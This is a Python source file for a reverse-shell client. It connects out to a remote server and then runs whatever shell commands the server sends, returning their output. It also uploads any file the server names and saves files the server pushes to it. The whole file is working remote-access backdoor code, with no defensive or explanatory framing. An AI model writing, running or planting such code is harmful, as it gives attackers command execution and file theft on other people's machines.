import socket
import subprocess
import sys
import os


PROXT_HOST = HOST
PROXY_PORT = PORT

SEPARATOR = "<SEPARATOR>"

BUFFER_SIZE = 1048576

# create the socket object
s = socket.socket()
try:

    # connect to the server
    s.connect((PROXT_HOST, PROXY_PORT))
    print("connecting...")
except:
    print("Failed to connect to proxy")
    sys.exit()
# receive the greeting message
message = s.recv(BUFFER_SIZE).decode()
print("Server:", message)

while True:
    # receive the command from the server
    command = s.recv(BUFFER_SIZE).decode()
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        print("Lost Connection to Server: Disconnected by User")
        break
    # if server sends download command
    elif command.lower().startswith("download"):
        filename = command[9:len(command)] # get last part of command : Must be an absolute path
        print("sending file " + filename)
        filesize = os.path.getsize(filename) # get size of file
        s.send(f"sending file {filename}{SEPARATOR}{filesize}".encode())
        with open(filename, "rb") as f:
            bytes_read = f.read(BUFFER_SIZE) # read the bytes from the file
            s.sendall(bytes_read) # send all bytes back to server
    # if server sends upload command
    elif command.lower().startswith("upload"):
        print("downloading file");
    elif command.lower().startswith("sending file"):
        fileinformation = os.path.basename(command[13:len(command)])
        filename, filesize = fileinformation.split(SEPARATOR)
        filename = os.path.basename(filename)
        with open(filename, "wb") as f:
            bytes_read = s.recv(BUFFER_SIZE)
            f.write(bytes_read)
    else:
        print(command)
        # execute the command and retrieve the results
        output = subprocess.getoutput(command)
        # send the results back to the server
        s.send(output.encode())
# close client connection
s.close()